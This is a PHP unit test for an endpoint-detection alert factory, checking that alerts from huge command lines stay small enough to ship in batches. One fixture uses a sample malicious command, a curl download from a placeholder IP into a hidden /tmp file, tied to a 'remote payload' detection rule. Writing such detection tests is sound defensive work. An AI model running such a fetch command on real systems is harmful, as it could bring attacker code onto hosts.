<?php

namespace Tests\Unit;

use App\Services\EdrAlertFactory;
use Tests\TestCase;

/**
 * Payload bounds.
 *
 * The Hub caps a decompressed request body at 8 MB and answers a larger one
 * with 413. The uploader can now recover from that, but the recovery is a
 * safety net rather than the fix: an alert whose size is unbounded will
 * eventually be one that cannot be shipped at any batch size, and the row is
 * then retired — a detection thrown away. Bounding the payload here is what
 * stops that happening in the first place.
 */
class EdrAlertFactoryBoundsTest extends TestCase
{
    private function event(string $cmdline): array
    {
        return [
            'ts' => 1700000000,
            'host' => 'bounds-01',
            'action' => 'exec',
            'sensor' => 'osquery',
            'pid' => 4242,
            'ppid' => 900,
            'uid' => 33,
            'username' => 'www-data',
            'path' => '/usr/bin/java',
            'cmdline' => $cmdline,
            'cwd' => '/srv',
            'container_id' => '',
        ];
    }

    private function finding(): array
    {
        return [[
            'rule' => 'EDR-003',
            'name' => 'Remote payload piped to interpreter',
            'severity' => 'high',
            'mitre' => 'T1105',
            'reason' => 'test',
        ]];
    }

    /**
     * A single Linux argument can be 128 KB and an argv can approach 2 MB —
     * a Java service or a `find ... -exec` line reaches that without anybody
     * behaving badly.
     */
    public function test_a_pathological_command_line_cannot_produce_an_unshippable_alert(): void
    {
        $factory = new EdrAlertFactory();

        // Two megabytes of classpath, which is a real shape rather than a
        // contrived one.
        $cmdline = '/usr/bin/java -cp ' . str_repeat('/opt/app/lib/some-dependency-1.2.3.jar:', 40000) . ' Main';

        $alert = $factory->fromEvent($this->event($cmdline), $this->finding());
        $bytes = strlen((string) json_encode($alert));

        $this->assertLessThan(
            64 * 1024,
            $bytes,
            'One alert must stay small enough that a full batch fits the Hub request ceiling'
        );

        // And a whole batch at that size still has room to spare.
        $this->assertLessThan(
            8 * 1024 * 1024,
            $bytes * 200,
            'A 200-alert batch of worst-case alerts must fit inside 8MB'
        );
    }

    /**
     * The bound must not cost anything on an ordinary alert — the detail an
     * analyst reads lives in the first few hundred bytes.
     */
    public function test_an_ordinary_alert_is_not_truncated(): void
    {
        $factory = new EdrAlertFactory();

        $alert = $factory->fromEvent(
            $this->event('curl http://198.51.100.7/x -o /tmp/.s'),
            $this->finding()
        );

        $this->assertStringNotContainsString('...', (string) $alert['raw_log']);
        $this->assertStringContainsString('198.51.100.7', (string) $alert['raw_log']);
        $this->assertSame('curl http://198.51.100.7/x -o /tmp/.s', $alert['process']['cmdline']);
    }
}
